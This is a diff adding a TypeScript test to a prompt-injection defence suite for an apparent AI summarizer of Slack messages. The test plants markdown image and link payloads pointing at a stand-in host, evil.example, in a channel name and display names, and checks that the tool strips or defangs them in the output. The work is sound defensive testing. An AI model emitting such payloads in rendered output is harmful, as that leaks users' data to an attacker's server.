@@ -254,6 +254,41 @@ describe("injection corpus — 3. exfiltration payloads in hostile summarizer ou
     expect(field).not.toContain("https://");
     expect(field).not.toMatch(/!?\[[^\]]*\]\(/); // no surviving markdown image/link wrapper
   });
+
+  // Evidence attribution (#54) is code-copied from the source item rather than written
+  // by the model — which makes it unfabricable, NOT trusted. A hostile workspace can
+  // rename a channel or a display name to an exfiltration payload, and those bytes
+  // reach `where`/`who` verbatim, so they must defang like every other output string.
+  test("evidence where/who are defanged even though code copied them", async () => {
+    const hostileAttribution: AnnotatedItem = {
+      source: "slack",
+      kind: "message",
+      timestamp: "2026-07-07T09:00:00Z",
+      bucket: "recent",
+      id: untrusted("hostile-attr"),
+      title: untrusted("Sounds good, shipping today"),
+      attribution: untrusted({
+        where: "#![](https://evil.example/?q=where)",
+        who: ["Ada [click](https://evil.example/?q=who1)", "https://evil.example/?q=who2"],
+      }),
+    };
+    const output: SummarizerOutput = {
+      summary: "ok",
+      items: [{ kind: "fyi", summary: "Shipping", evidence: [{ ref: 1, quote: "shipping today" }] }],
+    };
+    const { summarize } = fakeSummarizer(output);
+    const brief = await plan(bundleOf([hostileAttribution]), false, undefined, { summarize });
+
+    const entry = brief.items[0]!.evidence[0]!;
+    for (const field of [entry.where!, ...entry.who!]) {
+      expect(field).not.toContain("http://");
+      expect(field).not.toContain("https://");
+      expect(field).not.toMatch(/!?\[[^\]]*\]\(/);
+    }
+    // The markdown wrapper is stripped to its visible text, not merely neutralized.
+    expect(entry.where).toBe("#");
+    expect(entry.who).toEqual(["Ada click", "hxxps://evil.example/?q=who2"]);
+  });
 });
 
 // ── 4. fabricated evidence (plan seam) ──
